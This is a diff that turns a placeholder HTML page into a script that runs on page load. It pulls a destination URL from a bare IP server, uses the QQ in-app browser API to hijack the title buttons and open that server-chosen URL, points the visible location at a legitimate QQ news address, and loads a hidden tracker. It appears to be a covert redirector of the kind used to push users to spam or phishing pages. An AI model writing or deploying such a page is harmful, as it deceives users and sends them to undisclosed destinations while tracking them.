@@ -1,3 +1,54 @@
+
+
+
+  <!DOCTYPE html>
 <html>
-	<p>1111111111111</p>
+<meta charset="UTF-8">
+<head>
+	<title></title>
+</head>
+<body>
+<script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
+<script src="https:cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+<script type="text/javascript">
+	var data = ''
+	$.ajax({
+	  url: "http://117.50.46.232:8805/geturl1",
+	  success: function(res){
+	  	data = res
+	  	mqq.ui.setTitleButtons({
+		   left : {
+		       title : "😜",
+		       callback : function () {
+		           alert("😜😜😜😜😜😜😜😜😜😜😜😜😜😜")
+		       }
+		   },
+		   right : {
+		       title : "😜",
+		       callback : function () {
+		           alert("😜😜😜😜😜😜😜😜😜😜😜😜😜😜")
+		       }
+		   }
+		})
+
+	  	if(mqq.support("mqq.ui.openUrl")) {
+	  		window.location.href = 'http://xw.qq.com'
+		  	mqq.invoke("ui", "openUrl",{
+			    url     : data,
+			    target  : 1,
+			    style   : 0
+			});
+		} else {
+			
+		}
+	  	
+	  },
+	});
+
+
+</script>
+  <div style="display: none;">
+                     <script src="https://s5.cnzz.com/z_stat.php?id=1275341159&web_id=1275341159" language="JavaScript"></script>
+                     </div>
+</body>
 </html>
